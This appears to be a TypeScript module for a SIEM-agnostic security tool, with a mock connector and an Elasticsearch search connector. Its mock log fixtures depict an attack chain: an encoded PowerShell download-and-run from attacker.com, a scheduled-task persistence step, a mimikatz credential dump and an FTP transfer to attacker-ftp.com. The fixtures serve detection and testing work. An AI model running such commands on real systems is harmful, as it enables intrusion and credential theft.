
export interface SiemLog {
  "@timestamp": string;
  host: { name: string };
  user: { name: string };
  process: { name: string; command_line: string };
  event: { category: string; action: string };
  [key: string]: any;
}

/**
 * SiemConnector Interface
 * This abstraction allows the application to be SIEM-agnostic.
 * To add a new SIEM (e.g., Splunk), simply implement this interface.
 */
export interface SiemConnector {
  name: string;
  search(query: string): Promise<SiemLog[]>;
}

export class MockSiemConnector implements SiemConnector {
  name = "MockSIEM";
  private logs: SiemLog[];

  constructor(logs: SiemLog[]) {
    this.logs = logs;
  }

  async search(query: string): Promise<SiemLog[]> {
    console.log(`[MockSIEM] Searching for: ${query}`);
    const keywords = query.toLowerCase().replace(/["':]/g, " ").split(/\s+/).filter(k => k.length > 2 && k !== "or" && k !== "and");
    return this.logs.filter(log => {
      const logStr = JSON.stringify(log).toLowerCase();
      return keywords.some(k => logStr.includes(k));
    });
  }
}

/**
 * ElasticSearchConnector
 * Performs real-time lookups against an ELK instance using the REST API.
 * Uses query_string for flexible, powerful searching.
 */
export class ElasticSearchConnector implements SiemConnector {
  name = "ELK";
  private url: string;
  private apiKey: string;
  private index: string;

  constructor(url: string, apiKey: string, index: string = "logs-*") {
    this.url = url;
    this.apiKey = apiKey;
    this.index = index;
  }

  async search(query: string): Promise<SiemLog[]> {
    if (!this.url || !this.apiKey) {
      console.warn("[ELK] URL or API Key missing, falling back to empty results.");
      return [];
    }

    console.log(`[ELK] Querying ${this.url} for: ${query}`);
    
    try {
      const response = await fetch(`${this.url}/${this.index}/_search`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `ApiKey ${this.apiKey}`
        },
        body: JSON.stringify({
          query: {
            query_string: {
              query: query
            }
          },
          size: 100,
          sort: [{ "@timestamp": "desc" }]
        })
      });

      if (!response.ok) {
        const error = await response.text();
        throw new Error(`Elasticsearch error: ${response.status} - ${error}`);
      }

      const data = await response.json();
      return data.hits.hits.map((hit: any) => ({
        ...hit._source,
        _id: hit._id
      })) as SiemLog[];
    } catch (error) {
      console.error("[ELK] Search failed:", error);
      throw error;
    }
  }
}

export function getSiemConnector(): SiemConnector {
  const siemType = process.env.SIEM_TYPE || "mock";
  
  if (siemType === "elk") {
    return new ElasticSearchConnector(
      process.env.ELASTICSEARCH_URL || "",
      process.env.ELASTICSEARCH_API_KEY || "",
      process.env.ELASTICSEARCH_INDEX || "logs-*"
    );
  }
  
  // Default to mock
  return new MockSiemConnector([
    {
      "@timestamp": "2026-03-22T08:00:00Z",
      "host": { "name": "WKSTN-01" },
      "user": { "name": "jdoe" },
      "process": { "name": "outlook.exe", "command_line": "outlook.exe /open Invoice.doc" },
      "event": { "category": "file", "action": "creation" }
    },
    {
      "@timestamp": "2026-03-22T08:05:00Z",
      "host": { "name": "WKSTN-01" },
      "user": { "name": "jdoe" },
      "process": {
        "name": "powershell.exe",
        "command_line": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBzAGgAZQBsAGwALgBwAHMAMQAiACkA"
      },
      "event": { "category": "process", "action": "start" }
    },
    {
      "@timestamp": "2026-03-22T08:10:00Z",
      "host": { "name": "WKSTN-01" },
      "user": { "name": "jdoe" },
      "process": {
        "name": "schtasks.exe",
        "command_line": "schtasks.exe /create /tn \"UpdateCheck\" /tr \"C:\\Users\\jdoe\\AppData\\Local\\Temp\\shell.exe\" /sc daily /st 12:00"
      },
      "event": { "category": "process", "action": "start" }
    },
    {
      "@timestamp": "2026-03-22T08:15:00Z",
      "host": { "name": "WKSTN-01" },
      "user": { "name": "jdoe" },
      "process": { "name": "net.exe", "command_line": "net user /domain" },
      "event": { "category": "process", "action": "start" }
    },
    {
      "@timestamp": "2026-03-22T08:20:00Z",
      "host": { "name": "WKSTN-01" },
      "user": { "name": "jdoe" },
      "process": {
        "name": "mimikatz.exe",
        "command_line": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
      },
      "event": { "category": "process", "action": "start" }
    },
    {
      "@timestamp": "2026-03-22T08:30:00Z",
      "host": { "name": "WKSTN-01" },
      "user": { "name": "jdoe" },
      "process": { "name": "mstsc.exe", "command_line": "mstsc.exe /v:DC-01" },
      "event": { "category": "network", "action": "connection" }
    },
    {
      "@timestamp": "2026-03-22T09:00:00Z",
      "host": { "name": "DC-01" },
      "user": { "name": "admin" },
      "process": { "name": "ftp.exe", "command_line": "ftp.exe -s:commands.txt attacker-ftp.com" },
      "event": { "category": "network", "action": "connection" }
    }
  ]);
}
